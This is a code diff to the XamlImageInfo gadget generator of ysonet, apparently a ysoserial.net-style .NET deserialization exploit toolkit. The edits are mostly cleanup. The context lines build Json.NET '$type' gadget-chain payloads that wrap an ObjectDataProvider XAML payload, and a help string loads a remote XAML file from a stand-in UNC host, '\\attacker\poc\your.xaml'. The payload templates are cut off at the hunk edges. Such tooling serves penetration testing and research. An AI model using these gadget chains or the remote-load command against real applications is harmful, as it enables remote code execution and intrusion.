@@ -3,11 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
-using System.IO;
-using System.Linq;
 using System.Reflection;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Data;
 using ysonet.Helpers;
 
@@ -27,11 +23,6 @@ namespace ysonet.Generators
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "Json.NET" }; // MessagePack may work too, but it may have issues with the XamlImageInfo constructor (to be verified)
-        }
-
-        public override string Name()
-        {
-            return "XamlImageInfo";
         }
 
         public override string Finders()
@@ -57,12 +48,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.NotBridgeButDervied, "Variant 1 in GAC, Variant 2 not in GAC" };
-        }
-
-        public override string SupportedBridgedFormatter()
-        {
-            return Formatters.BinaryFormatter;
+            return new List<string> { "Variant 1 in GAC, Variant 2 not in GAC" };
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -92,7 +78,7 @@ namespace ysonet.Generators
                     odp.IsInitialLoadEnabled = false;
                     odp.ObjectInstance = p;
 
-                    String xamlPayload = SerializersHelper.Xaml_serialize(odp).Replace("utf-16","utf-8");
+                    String xamlPayload = SerializersHelper.Xaml_serialize(odp).Replace("utf-16", "utf-8");
 
                     String streamPayload = @"{
     '$type':'Microsoft.Web.Deployment.ReadOnlyStreamFromStrings, Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
@@ -115,7 +101,7 @@ namespace ysonet.Generators
 }";
                 }
                 else
-                {                    
+                {
                     if (inputArgs.Test)
                     {
                         Console.WriteLine("This gadget loads remote/local file: -c argument should provide a file path to your XAML file. UNC path can be used for the remote file loading\r\nExample: ysonet.exe -g XamlImageInfo -f Json.NET -c '\\\\attacker\\poc\\your.xaml'");
@@ -123,7 +109,7 @@ namespace ysonet.Generators
 
                     inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
                     inputArgs.IsRawCmd = true;
-                    
+
                     payload = @"{
     '$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
     'stream':{
